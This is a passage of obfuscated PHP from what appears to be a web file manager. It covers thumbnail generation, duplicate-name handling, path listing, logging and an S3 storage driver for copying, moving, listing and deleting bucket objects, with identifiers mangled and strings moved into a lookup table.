$†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[97]]) { $†ù◊∞ÿ÷ = $¢‹ù¶æ—; $à»ß‘¸¬ = $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[194]]; if ($à»ß‘¸¬ && isset($à»ß‘¸¬[$ÕÖﬁ⁄Ω≈[195]])) { if ($à»ß‘¸¬[$ÕÖﬁ⁄Ω≈[195]] <= $ç˚”≈ì• && $à»ß‘¸¬[$ÕÖﬁ⁄Ω≈[196]] <= $ç˚”≈ì•) { $›ùæ«÷± = !0; } } } if ($†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[89]] <= 1024 * 50 || $›ùæ«÷± || !function_exists($ÕÖﬁ⁄Ω≈[197]) || $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[179]] == $ÕÖﬁ⁄Ω≈[198]) { return $this->fileOut($…∆É˝—, !1, $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[32]]); } $˜±Ó˜±Ê = kodIO::hashPath($†ù◊∞ÿ÷); $ßÔòû◊û = "\143\x6f\166\x65\162\137{$˜±Ó˜±Ê}\137{$ç˚”≈ì•}\56\160\156\147"; $ÓﬁßîÚ† = IO_PATH_SYSTEM_TEMP . $ÕÖﬁ⁄Ω≈[199]; $©∫ÿù®˛ = IO::infoFullSimple($ÓﬁßîÚ†); $–Ã≤Çèú = $©∫ÿù®˛ && is_array($©∫ÿù®˛) ? $©∫ÿù®˛[$ÕÖﬁ⁄Ω≈[97]] : $ÕÖﬁ⁄Ω≈[12]; if (!$–Ã≤Çèú) { $–Ã≤Çèú = IO::mkdir($ÓﬁßîÚ†); } if ($†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[200]] == $ÕÖﬁ⁄Ω≈[201] && isset($†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[202]]) && $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[202]] == kodIO::sourceID($–Ã≤Çèú)) { $Ûà˛îΩŒ = $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[203]]; if ($ç˚”≈ì• <= 500) { $êöˆ¥«õ = preg_replace($ÕÖﬁ⁄Ω≈[204], $ÕÖﬁ⁄Ω≈[205], $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[32]]); $Ûà˛îΩŒ = IO::fileNameExist($–Ã≤Çèú, $êöˆ¥«õ); } return IO::fileOut(KodIO::make($Ûà˛îΩŒ), !1, $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[32]]); } $‚≤÷◊ﬁ˚ = IO::fileNameExist($–Ã≤Çèú, $ßÔòû◊û); if ($‚≤÷◊ﬁ˚) { return IO::fileOut(KodIO::make($‚≤÷◊ﬁ˚), !1, $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[32]]); } if ($ç˚”≈ì• > 1000) { $this->makeImageCover($–Ã≤Çèú, $…∆É˝—, $ßÔòû◊û, $ç˚”≈ì•); $this->makeImageCover($–Ã≤Çèú, $…∆É˝—, "\x63\x6f\x76\145\162\x5f{$˜±Ó˜±Ê}\x5f\62\65\60\56\160\x6e\147", 250); $‚≤÷◊ﬁ˚ = IO::fileNameExist($–Ã≤Çèú, $ßÔòû◊û); if ($‚≤÷◊ﬁ˚) { return IO::fileOut(KodIO::make($‚≤÷◊ﬁ˚), !1, $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[32]]); } die; } if (!kodIO::allowCover($†ù◊∞ÿ÷)) { return $this->fileOut($…∆É˝—, !1, $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[32]]); } $ñòœ∏©ø = Cache::get($ßÔòû◊û); if ($ñòœ∏©ø == $ÕÖﬁ⁄Ω≈[206] || $ñòœ∏©ø == $ÕÖﬁ⁄Ω≈[207]) { echo $ñòœ∏©ø; die; } Cache::set($ßÔòû◊û, $ÕÖﬁ⁄Ω≈[207], 60); $¨ÀîÑ∂Î = array($–Ã≤Çèú, $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[97]], $ßÔòû◊û, $ç˚”≈ì•); $å§ì·ÛØ = $ÕÖﬁ⁄Ω≈[208] . $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[89]] . $ÕÖﬁ⁄Ω≈[209] . $ßÔòû◊û . $ÕÖﬁ⁄Ω≈[210] . $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[32]] . $ÕÖﬁ⁄Ω≈[211] . $†ù◊∞ÿ÷[$ÕÖﬁ⁄Ω≈[97]]; TaskQueue::add($ÕÖﬁ⁄Ω≈[212], $¨ÀîÑ∂Î, $å§ì·ÛØ, $ßÔòû◊û); } public function makeImageCover($îïÂ‡€Û, $¢é®≠ùÆ, $…¨≥‚ç˝, $Õ‘—ﬂäî) { $ÎÌ∞ÉúÖ =& $_SERVER[ˆë€Ï⁄∂]; if (IO::fileNameExist($îïÂ‡€Û, $…¨≥‚ç˝)) { return $ÎÌ∞ÉúÖ[213]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $∑—≥Å‹ú = DATA_THUMB . $…¨≥‚ç˝; del_file($∑—≥Å‹ú); $˜µ–≠â≥ = IO::copy($¢é®≠ùÆ, TEMP_FILES, !1, $…¨≥‚ç˝); if (!@file_exists($˜µ–≠â≥)) { return $ÎÌ∞ÉúÖ[214]; } ImageThumb::createThumb($˜µ–≠â≥, $∑—≥Å‹ú, $Õ‘—ﬂäî, $Õ‘—ﬂäî * 10); if (@file_exists($∑—≥Å‹ú)) { Cache::remove($…¨≥‚ç˝); return IO::move($∑—≥Å‹ú, $îïÂ‡€Û); } Cache::set($…¨≥‚ç˝, $ÎÌ∞ÉúÖ[206], 600); del_file($∑—≥Å‹ú); return $ÎÌ∞ÉúÖ[215] . $˜µ–≠â≥ . $ÎÌ∞ÉúÖ[84]; } public function fileOutImageServer($‹⁄≤¥á›, $˝‡íö≠Ù = 250) { $this->fileOutImage($‹⁄≤¥á›, $˝‡íö≠Ù); } public function fileNameAuto($¥€æπí¿, $äˆÏ∞¶∑, $Ç §î•– = REPEAT_RENAME, $Ü“ú®ãê = false) { $ﬂ–«Û‰‚ =& $_SERVER[ˆë€Ï⁄∂]; $ΩÄ»ÄŒÇ = $¥€æπí¿ === $ﬂ–«Û‰‚[12] ? $äˆÏ∞¶∑ : rtrim($¥€æπí¿, $ﬂ–«Û‰‚[8]) . $ﬂ–«Û‰‚[8] . $äˆÏ∞¶∑; if ($Ç §î•– == REPEAT_REPLACE || !$this->exist($ΩÄ»ÄŒÇ) || $Ü“ú®ãê && $Ç §î•– != REPEAT_RENAME_FOLDER) { return $äˆÏ∞¶∑; } if ($Ç §î•– == REPEAT_SKIP) { return !1; } $√ÌÛﬁåî = $ﬂ–«Û‰‚[10] . get_path_ext($äˆÏ∞¶∑); $√ÌÛﬁåî = $√ÌÛﬁåî == $ﬂ–«Û‰‚[10] || $Ü“ú®ãê ? $ﬂ–«Û‰‚[12] : $√ÌÛﬁåî; $∂π÷Õ˚” = 1; $¥ÜË „È = substr($äˆÏ∞¶∑, 0, strlen($äˆÏ∞¶∑) - strlen($√ÌÛﬁåî)); $ìöÕ¢£é = $¥ÜË „È . "\x28{$∂π÷Õ˚”}\51{$√ÌÛﬁåî}"; while ($this->exist(rtrim($¥€æπí¿, $ﬂ–«Û‰‚[8]) . $ﬂ–«Û‰‚[8] . $ìöÕ¢£é)) { $ìöÕ¢£é = $¥ÜË „È . "\x28{$∂π÷Õ˚”}\51{$√ÌÛﬁåî}"; $∂π÷Õ˚”++; } return $ìöÕ¢£é; } private function fileNameAutoList($¿¸∫‹È°, $ÑΩ≥‘Çî, $êçÕ¥Õ  = false) { $ Ÿ·íÚÕ =& $_SERVER[ˆë€Ï⁄∂]; $ÃºÀº˙∂ = $this->listPath($¿¸∫‹È°, !0); $ÃºÀº˙∂ = array_merge($ÃºÀº˙∂[$ Ÿ·íÚÕ[95]], $ÃºÀº˙∂[$ Ÿ·íÚÕ[96]]); $ÁÆÚıäº = array_to_keyvalue($ÃºÀº˙∂, $ Ÿ·íÚÕ[12], $ Ÿ·íÚÕ[32]); $˜÷ÖûŒ◊ = $ Ÿ·íÚÕ[10] . get_path_ext($ÑΩ≥‘Çî); $˜÷ÖûŒ◊ = $˜÷ÖûŒ◊ == $ Ÿ·íÚÕ[10] || $êçÕ¥Õ  ? $ Ÿ·íÚÕ[12] : $˜÷ÖûŒ◊; $øè•öÌß = substr($ÑΩ≥‘Çî, 0, strlen($ÑΩ≥‘Çî) - strlen($˜÷ÖûŒ◊)); $√Ù“ÚÔ∂ = $øè•öÌß . "\50\60\51{$˜÷ÖûŒ◊}"; for ($Èëıßœ˚ = 1; $Èëıßœ˚ <= count($ÁÆÚıäº) + 1; $Èëıßœ˚++) { $√Ù“ÚÔ∂ = $øè•öÌß . "\50{$Èëıßœ˚}\51{$˜÷ÖûŒ◊}"; if (!in_array_not_case($√Ù“ÚÔ∂, $ÁÆÚıäº)) { return $√Ù“ÚÔ∂; } } return $√Ù“ÚÔ∂; } public function listAllFiles($ª§€“•…, $∏ê®Ï¯) { $õÙççŸ∞ =& $_SERVER[ˆë€Ï⁄∂]; if (empty($∏ê®Ï¯)) { return array(); } $ˆ˘÷Èß¥ = array_keys($∏ê®Ï¯); $–≤Ûπ¥Œ = array(); $ª§€“•… = trim($ª§€“•…, $õÙççŸ∞[8]); foreach ($∏ê®Ï¯ as $‹ı˙ı™» => $˘â»à≠è) { $µ°ÆÂÊ± = ltrim(substr(trim($‹ı˙ı™», $õÙççŸ∞[8]), strlen($ª§€“•…)), $õÙççŸ∞[8]); if (substr($‹ı˙ı™», -1) == $õÙççŸ∞[8]) { $µ°ÆÂÊ± = rtrim($µ°ÆÂÊ±, $õÙççŸ∞[8]) . $õÙççŸ∞[8]; } $–≤Ûπ¥Œ = array_merge($–≤Ûπ¥Œ, $this->slicePath($µ°ÆÂÊ±)); } $∏Æ¬˙ÿÂ = array(); foreach (array_unique($–≤Ûπ¥Œ) as $ûúìç©≠) { $áò‚££È = array($õÙççŸ∞[97] => $this->getPathOuter($õÙççŸ∞[8] . $ª§€“•… . $õÙççŸ∞[8] . $ûúìç©≠), $õÙççŸ∞[88] => 1, $õÙççŸ∞[89] => 0); if (substr($ûúìç©≠, -1) != $õÙççŸ∞[8]) { $áò‚££È[$õÙççŸ∞[88]] = 0; $Øﬁﬂìü¡ = $this->getPath($ª§€“•… . $õÙççŸ∞[8] . $ûúìç©≠); if (isset($∏ê®Ï¯[$Øﬁﬂìü¡])) { $öíÆ£º≥ = $∏ê®Ï¯[$Øﬁﬂìü¡]; if (isset($öíÆ£º≥[$õÙççŸ∞[89]])) { $áò‚££È[$õÙççŸ∞[89]] = intval($öíÆ£º≥[$õÙççŸ∞[89]]); } if (isset($öíÆ£º≥[$õÙççŸ∞[216]])) { $áò‚££È[$õÙççŸ∞[98]] = intval($öíÆ£º≥[$õÙççŸ∞[216]]); } } } $∏Æ¬˙ÿÂ[] = $áò‚££È; } return $∏Æ¬˙ÿÂ; } public function slicePath($ÑÇ–Èó¯) { $Ÿßß¸÷¨ =& $_SERVER[ˆë€Ï⁄∂]; $ŸÎô⁄Áê = explode($Ÿßß¸÷¨[8], trim($ÑÇ–Èó¯, $Ÿßß¸÷¨[8])); $ÔÂ˝£«∞ = 0; do { ++$ÔÂ˝£«∞; $˘ﬁÃ»ä¬[] = implode($Ÿßß¸÷¨[8], array_slice($ŸÎô⁄Áê, 0, $ÔÂ˝£«∞)) . $Ÿßß¸÷¨[8]; } while ($ÔÂ˝£«∞ < count($ŸÎô⁄Áê)); $˘ﬁÃ»ä¬[count($ŸÎô⁄Áê) - 1] = $ÑÇ–Èó¯; return $˘ﬁÃ»ä¬; } public function getHost() { $•Ú…Ñ∑∞ =& $_SERVER[ˆë€Ï⁄∂]; $Õßôù‰´ = parse_url(trim($this->domain, $•Ú…Ñ∑∞[8])); $¸ûÛâßÇ = isset($Õßôù‰´[$•Ú…Ñ∑∞[217]]) ? $Õßôù‰´[$•Ú…Ñ∑∞[217]] : http_type(); $‡Íº•˙Ø = isset($Õßôù‰´[$•Ú…Ñ∑∞[218]]) ? $Õßôù‰´[$•Ú…Ñ∑∞[218]] : $Õßôù‰´[$•Ú…Ñ∑∞[97]]; if (isset($Õßôù‰´[$•Ú…Ñ∑∞[219]])) { $‡Íº•˙Ø .= $•Ú…Ñ∑∞[4] . $Õßôù‰´[$•Ú…Ñ∑∞[219]]; } return $¸ûÛâßÇ . $•Ú…Ñ∑∞[220] . $‡Íº•˙Ø; } public function pathEncode($ ç◊Ò Ä) { $˜‚öÇÿ† =& $_SERVER[ˆë€Ï⁄∂]; return str_replace($˜‚öÇÿ†[221], $˜‚öÇÿ†[8], rawurlencode($ ç◊Ò Ä)); } public function writeLog($¶ÙÇíØ£ = '', $∑É˘‘ñø = false) { $åº’Ú¯Ö =& $_SERVER[ˆë€Ï⁄∂]; $˛Œ ‹⁄ø = in_array(ACTION, array($åº’Ú¯Ö[222], $åº’Ú¯Ö[223])); if (!$˛Œ ‹⁄ø && !GLOBAL_DEBUG) { return; } $Â©åµˆø = $¶ÙÇíØ£; static $ÒÔ˘ˆÈÓ = null; if (!$ÒÔ˘ˆÈÓ) { $ÒÔ˘ˆÈÓ = strtoupper($this->getType()); } $¶ÙÇíØ£ = $ÒÔ˘ˆÈÓ . $åº’Ú¯Ö[224] . $¶ÙÇíØ£; if ($∑É˘‘ñø) { $¯ ﬂµ∫í = error_get_last(); if ($¯ ﬂµ∫í) { $¶ÙÇíØ£ = array($¶ÙÇíØ£, $¯ ﬂµ∫í); } } write_log($¶ÙÇíØ£, $åº’Ú¯Ö[225]); if ($˛Œ ‹⁄ø) { throw new Exception($Â©åµˆø); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Çç¬Ãì) { set_timeout(); require_once SDK_DIR . $_SERVER[ˆë€Ï⁄∂][226]; parent::__construct(); $this->_init($Çç¬Ãì); } public function _init($≤û∂ñõŸ) { $°¸Ê∑⁄ =& $_SERVER[ˆë€Ï⁄∂]; $this->config = $≤û∂ñõŸ; foreach ($≤û∂ñõŸ as $¶Õ¸ŒÚ => $ﬂÇ÷√’·) { if (isset($this->{$¶Õ¸ŒÚ})) { $this->{$¶Õ¸ŒÚ} = $ﬂÇ÷√’·; } } $this->endpoint = $≤û∂ñõŸ[$°¸Ê∑⁄[227]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Î¶ê‰âÅ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Î¶ê‰âÅ, 0, 7) == $°¸Ê∑⁄[228]) { $Î¶ê‰âÅ = $°¸Ê∑⁄[229] . substr($Î¶ê‰âÅ, 7); } $this->client->setEndpoint($Î¶ê‰âÅ); if (in_array(ACTION, array($°¸Ê∑⁄[222], $°¸Ê∑⁄[223]))) { $this->client->setExceptions(); } } public function setSignVersion($ô˜±Úú€ = "\166\64") { $this->signVer = $ô˜±Úú€; $this->client->setSignVersion($ô˜±Úú€); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ÚÃ·ÓÒæ) { return null; } } public function isBucketCors() { $≠ı∫»Ç∑ =& $_SERVER[ˆë€Ï⁄∂]; $≤¨Æ¢Ïø = $this->getBucketCors(); if (!$≤¨Æ¢Ïø || !is_array($≤¨Æ¢Ïø)) { return !1; } if (!is_array($≤¨Æ¢Ïø[$≠ı∫»Ç∑[230]])) { $≤¨Æ¢Ïø[$≠ı∫»Ç∑[230]] = explode($≠ı∫»Ç∑[50], $≤¨Æ¢Ïø[$≠ı∫»Ç∑[230]]); } if ($≤¨Æ¢Ïø[$≠ı∫»Ç∑[231]] != $≠ı∫»Ç∑[232] || !in_array($≠ı∫»Ç∑[232], $≤¨Æ¢Ïø[$≠ı∫»Ç∑[230]])) { return !1; } $ƒÑì¨ƒ˝ = array_map($≠ı∫»Ç∑[233], $≤¨Æ¢Ïø[$≠ı∫»Ç∑[234]]); if (!is_array($ƒÑì¨ƒ˝)) { $ƒÑì¨ƒ˝ = array(); } $®€”ÖñÄ = array($≠ı∫»Ç∑[235], $≠ı∫»Ç∑[236], $≠ı∫»Ç∑[237], $≠ı∫»Ç∑[238], $≠ı∫»Ç∑[239]); $·≥∑ﬂ¶” = array_diff($®€”ÖñÄ, $ƒÑì¨ƒ˝); return empty($·≥∑ﬂ¶”); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Ù•Çç„¸, $¶´ìœ»˛ = '', $µáØ∏çÓ = REPEAT_RENAME) { $ÙäÙÑ•† = $this->setContent($Ù•Çç„¸, $¶´ìœ»˛); if ($ÙäÙÑ•† !== !1) { return $this->getPathOuter($Ù•Çç„¸); } return !1; } public function mkdir($√¡´Ë∏¢, $øÎº‰Ù÷ = REPEAT_SKIP) { $•∑Ç€≈… =& $_SERVER[ˆë€Ï⁄∂]; if (empty($√¡´Ë∏¢) && $√¡´Ë∏¢ !== $•∑Ç€≈…[240]) { return !1; } if ($øÎº‰Ù÷ && $this->_isFolder($√¡´Ë∏¢)) { return $this->getPathOuter($√¡´Ë∏¢); } $ÖÙòæÉä = $this->setContent($√¡´Ë∏¢, $•∑Ç€≈…[12], !0); if ($ÖÙòæÉä !== !1) { return $this->getPathOuter($√¡´Ë∏¢); } return !1; } public function copyFile($˚ïòò¶ﬁ, $é≈∂˚ˆ—, $È Ë•âÔ = array()) { $˜ó¥°Ì€ =& $_SERVER[ˆë€Ï⁄∂]; $∞¡…˘˙√ = $this->objectMeta($˚ïòò¶ﬁ); if (!$∞¡…˘˙√) { return !1; } if ($∞¡…˘˙√[$˜ó¥°Ì€[89]] <= 1024 * 1024 * 200) { $µ»∞ñûÇ = $this->client->copyObject($this->bucket, $˚ïòò¶ﬁ, $this->bucket, $é≈∂˚ˆ—, $˜ó¥°Ì€[241], $È Ë•âÔ); } else { $µ»∞ñûÇ = $this->client->multiCopyObject($this->bucket, $˚ïòò¶ﬁ, $this->bucket, $é≈∂˚ˆ—, $È Ë•âÔ); } $µ»∞ñûÇ = $µ»∞ñûÇ ? $this->getPathOuter($é≈∂˚ˆ—) : !1; return $µ»∞ñûÇ; } public function moveFile($éÅ‘ØØ≥, $¬ß«´∆˙) { if ($this->copyFile($éÅ‘ØØ≥, $¬ß«´∆˙)) { $this->delFile($éÅ‘ØØ≥); return $this->getPathOuter($¬ß«´∆˙); } return !1; } public function delFile($†ıú·†º) { return $this->client->deleteObject($this->bucket, $†ıú·†º); } public function delFolder($ñ÷◊›èﬂ) { $ûπÆ˙¶ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->exist($ñ÷◊›èﬂ)) { return !0; } $this->listItemCache = !1; $≈¨âØ∂ï = $this->fileList($ñ÷◊›èﬂ); $this->listItemCache = !0; $ê ÁÛŸÒ = trim($ñ÷◊›èﬂ, $ûπÆ˙¶[8]) . $ûπÆ˙¶[8]; if (!empty($ñ÷◊›èﬂ) && $ñ÷◊›èﬂ !== $ûπÆ˙¶[240] && !in_array($ê ÁÛŸÒ, $≈¨âØ∂ï[$ûπÆ˙¶[95]])) { $≈¨âØ∂ï[$ûπÆ˙¶[95]][] = $ê ÁÛŸÒ; } $≥ë·îó = $this->delByBatch($≈¨âØ∂ï[$ûπÆ˙¶[96]]); if (!$≥ë·îó) { return !1; } $≥ë·îó = $this->delByBatch($≈¨âØ∂ï[$ûπÆ˙¶[95]]); if (!$≥ë·îó) { return !1; } return $this->delFile($ê ÁÛŸÒ); } private function delByBatch($ø‘÷ªÔ¡) { foreach (array_chunk($ø‘÷ªÔ¡, 1000) as $˛⁄µπØ§) { $ã¡ßö≠î = $this->client->deleteObjects($this->bucket, $˛⁄µπØ§); if (!$ã¡ßö≠î) { return !1; } } return !0; } public function rename($√ìÇ’Ô∞, $µ±¢éÎ±) { return $this->renameObject($√ìÇ’Ô∞, $µ±¢éÎ±); } public function listPath($¸º¬Ô∫É, $ÓÑñï¿Ì = false) { $◊«∑èÇ¯ =& $_SERVER[ˆë€Ï⁄∂]; $©÷∞¶»√ = $this->fileList($¸º¬Ô∫É, $◊«∑èÇ¯[8], !0); foreach ($©÷∞¶»√[$◊«∑èÇ¯[95]] as $£∞äÚ≠⁄ => $ò⁄Œç∂≤) { $©÷∞¶»√[$◊«∑èÇ¯[95]][$£∞äÚ≠⁄] = $this->folderInfo($ò⁄Œç∂≤, $ÓÑñï¿Ì, $ò⁄Œç∂≤); } foreach ($©÷∞¶»√[$◊«∑èÇ¯[96]] as $£∞äÚ≠⁄ => $ò⁄Œç∂≤) { $©÷∞¶»√[$◊«∑èÇ¯[96]][$£∞äÚ≠⁄] = $this->fileInfo($ò⁄Œç∂≤[$◊«∑èÇ¯[32]], $ÓÑñï¿Ì, $ò⁄Œç∂≤); } return $©÷∞¶»√; } protected function infoChildren($¨›»Àƒº, &$Ì‘ö∫’π) { $¡™˘˘˛± =& $_SERVER[ˆë€Ï⁄∂]; $ΩﬁıÏ√£ = $this->fileList($¨›»Àƒº, $¡™˘˘˛±[12], !0); $Ì‘ö∫’π[$¡™˘˘˛±[91]] += count($ΩﬁıÏ√£[$¡™˘˘˛±[95]]); $Ì‘ö∫’π[$¡™˘˘˛±[90]] += count($ΩﬁıÏ√£[$¡™˘˘˛±[96]]); foreach ($ΩﬁıÏ√£[$¡™˘˘˛±[96]] as $ÇßûÁª‰) { if (!$ÇßûÁª‰ || !$ÇßûÁª‰[$¡™˘˘˛±[89]]) { continue; } $Ì‘ö∫’π[$¡™˘˘˛±[89]] += $ÇßûÁª‰[$¡™˘˘˛±[89]]; } } private function fileInfo($ÆŸíõ¬·, $Ø©˘º¨— = false, $¡°„ˆ≥ë = array()) { $±Û∆ Íµ =& $_SERVER[ˆë€Ï⁄∂]; $´ªÔÇ∑ÿ = array($±Û∆ Íµ[32] => $this->pathThis($ÆŸíõ¬·), $±Û∆ Íµ[97] => $this->getPathOuter($ÆŸíõ¬·), $±Û∆ Íµ[33] => $±Û∆ Íµ[242], $±Û∆ Íµ[179] => $this->ext($ÆŸíõ¬·), $±Û∆ Íµ[89] => isset($¡°„ˆ≥ë[$±Û∆ Íµ[89]]) ? $¡°„ˆ≥ë[$±Û∆ Íµ[89]] : 0); if ($Ø©˘º¨—) { return $´ªÔÇ∑ÿ; } $´ªÔÇ∑ÿ[$±Û∆ Íµ[243]] = $´ªÔÇ∑ÿ[$±Û∆ Íµ[98]] = 0; $´ªÔÇ∑ÿ[$±Û∆ Íµ[244]] = $´ªÔÇ∑ÿ[$±Û∆ Íµ[245]] = !0; if (empty($¡°„ˆ≥ë)) { $¡°„ˆ≥ë = $this->objectMeta($ÆŸíõ¬·); if (!$¡°„ˆ≥ë) { return $´ªÔÇ∑ÿ; } } if (isset($¡°„ˆ≥ë[$±Û∆ Íµ[246]]) && $¡°„ˆ≥ë[$±Û∆ Íµ[246]]) { $´ªÔÇ∑ÿ[$±Û∆ Íµ[247]] = $¡°„ˆ≥ë[$±Û∆ Íµ[246]]; } if (isset($¡°„ˆ≥ë[$±Û∆ Íµ[216]])) { $´ªÔÇ∑ÿ[$±Û∆ Íµ[98]] = $¡°„ˆ≥ë[$±Û∆ Íµ[216]]; } if (isset($¡°„ˆ≥ë[$±Û∆ Íµ[89]])) { $´ªÔÇ∑ÿ[$±Û∆ Íµ[89]] = $¡°„ˆ≥ë[$±Û∆ Íµ[89]]; } return $´ªÔÇ∑ÿ; } private function folderInfo($ÂÜÌºòÃ, $ëª’èÅ≈ = false, $©ÈÛæ⁄´ = array()) { $Í™¨ƒíÈ =& $_SERVER[ˆë€Ï⁄∂]; $òíﬂöÎç = array($Í™¨ƒíÈ[32] => $this->pathThis($ÂÜÌºòÃ), $Í™¨ƒíÈ[97] => $this->getPathOuter($Í™¨ƒíÈ[8] . $ÂÜÌºòÃ), $Í™¨ƒíÈ[33] => $Í™¨ƒíÈ[88]); if ($ëª’èÅ≈) { return $òíﬂöÎç; } $òíﬂöÎç[$Í™¨ƒíÈ[243]] = $òíﬂöÎç[$Í™¨ƒíÈ[98]] = 0; $òíﬂöÎç[$Í™¨ƒíÈ[244]] = $òíﬂöÎç[$Í™¨ƒíÈ[245]] = !0; if ($ÂÜÌºòÃ == $Í™¨ƒíÈ[12]) { return $òíﬂöÎç; } if (empty($©ÈÛæ⁄´)) { $©ÈÛæ⁄´ = $this->objectMeta(trim($ÂÜÌºòÃ, $Í™¨ƒíÈ[8]) . $Í™¨ƒíÈ[8]); } if (isset($©ÈÛæ⁄´[$Í™¨ƒíÈ[216]])) { $òíﬂöÎç[$Í™¨ƒíÈ[243]] = $©ÈÛæ⁄´[$Í™¨ƒíÈ[216]]; } return $òíﬂöÎç; } private function fileList($ïÆﬁƒÀÚ, $ÎóîÕä  = '', $çåûòó° = 0) { $òíÏ¸É‡ =& $_SERVER[ˆë€Ï⁄∂]; $º≈Ö›∞ñ = rtrim($ïÆﬁƒÀÚ, $òíÏ¸É‡[8]) . $òíÏ¸É‡[8]; $©∏êÒ–Ó = $this->listObjs($º≈Ö›∞ñ, null, null, $ÎóîÕä ); if (!$©∏êÒ–Ó) { return array($òíÏ¸É‡[95] => array(), $òíÏ¸É‡[96] => array()); } $¿±æÃ”€ = $ÿµπ≥Õ÷ = array(); foreach ($©∏êÒ–Ó[$òíÏ¸É‡[248]] as $‘…‘¢îÏ) { $âﬁπ‚£Ù = $‘…‘¢îÏ[$òíÏ¸É‡[32]]; if ($âﬁπ‚£Ù == $º≈Ö›∞ñ) { continue; } $œ«§õ – = isset($‘…‘¢îÏ[$òíÏ¸É‡[89]]) ? $‘…‘¢îÏ[$òíÏ¸É‡[89]] : 0; $ÜÓ∂ãáè = $œ«§õ – == 0 && substr($âﬁπ‚£Ù, strlen($âﬁπ‚£Ù) - 1, 1) == $òíÏ¸É‡[8] ? !0 : !1; $this->cacheMethodInfoSet($âﬁπ‚£Ù, $ÜÓ∂ãáè, $‘…‘¢îÏ); if ($ÜÓ∂ãáè) { $¿±æÃ”€[] = $âﬁπ‚£Ù; continue; } $ÿµπ≥Õ÷[] = $çåûòó° ? $‘…‘¢îÏ : $âﬁπ‚£Ù; } foreach ($©∏êÒ–Ó[$òíÏ¸É‡[249]] as $‘…‘¢îÏ) { $¿±æÃ”€[] = $‘…‘¢îÏ[$òíÏ¸É‡[32]]; $this->cacheMethodInfoSet($‘…‘¢îÏ[$òíÏ¸É‡[32]], !0); } $this->cacheMethodInfoSet($ïÆﬁƒÀÚ, !0); return array($òíÏ¸É‡[95] => $¿±æÃ”€, $òíÏ¸É‡[96] => $ÿµπ≥Õ÷); } private function listObjs($¶„˝’±†, $øô∑èê… = null, $∞»…ˆÈÛ = null, $õ∆ÛÁû◊ = null) { $ïÌÈãÒî =& $_SERVER[ˆë€Ï⁄∂]; $¶„˝’±† = trim($¶„˝’±†, $ïÌÈãÒî[8]); $üªŒ¯ªò = empty($¶„˝’±†) && $¶„˝’±† !== $ïÌÈãÒî[240] ? $ïÌÈãÒî[12] : $¶„˝’±† . $ïÌÈãÒî[8]; return $this->client->getBucket($this->bucket, $üªŒ¯ªò, $øô∑èê…, $∞»…ˆÈÛ, $õ∆ÛÁû◊, !0); } public function has($Ò»‹îÎÎ, $˛µ¥íãﬂ = false, $Ìπ¯ñÒ˜ = true) { $€ëçﬂå˛ =& $_SERVER[ˆë€Ï⁄∂]; $Ò»‹îÎÎ = trim($Ò»‹îÎÎ, $€ëçﬂå˛[8]); $›Ò¯êã¡ = empty($Ò»‹îÎÎ) && $Ò»‹îÎÎ !== $€ëçﬂå˛[240] ? $€ëçﬂå˛[12] : $Ò»‹îÎÎ . $€ëçﬂå˛[8]; $˘ÔßåÖˆ = null; $î§ÅÛüæ = 500; $Û«‹∂ÿã = $€ëçﬂå˛[8]; $—éÄ∏ÈÜ = $∏ì≠·áÓ = array(); while (!0) { $Ìÿ≈è”ç = $this->listObjs($Ò»‹îÎÎ, $˘ÔßåÖˆ, $î§ÅÛüæ, $Û«‹∂ÿã); if (!$Ìÿ≈è”ç) { break; } $˘ÔßåÖˆ = $Ìÿ≈è”ç[$€ëçﬂå˛[250]]; $˚Ùø∫¶¯ = $Ìÿ≈è”ç[$€ëçﬂå˛[248]]; $À◊§˛˝® = $Ìÿ≈è”ç[$€ëçﬂå˛[249]]; if (empty($˚Ùø∫¶¯) && empty($À◊§˛˝®)) { break; } if (count($˚Ùø∫¶¯) == 1 && $˚Ùø∫¶¯[0][$€ëçﬂå˛[32]] == $›Ò¯êã¡) { break; } if ($˛µ¥íãﬂ) { if (count($˚Ùø∫¶¯)) { $˚Ùø∫¶¯ = array_column($˚Ùø∫¶¯, $€ëçﬂå˛[32]); $—éÄ∏ÈÜ = array_merge($—éÄ∏ÈÜ, $˚Ùø∫¶¯); } if (count($À◊§˛˝®)) { $À◊§˛˝® = array_column($À◊§˛˝®, $€ëçﬂå˛[32]); $∏ì≠·áÓ = array_merge($∏ì≠·áÓ, $À◊§˛˝®); } if ($˘ÔßåÖˆ === null) { break; } continue; } if ($Ìπ¯ñÒ˜) { if (!empty($˚Ùø∫¶¯)) { if (count($˚Ùø∫¶¯) > 1 || isset($˚Ùø∫¶¯[0][$€ëçﬂå˛[32]]) && $˚Ùø∫¶¯[0][$€ëçﬂå˛[32]] != $›Ò¯êã¡) { return !0; } } 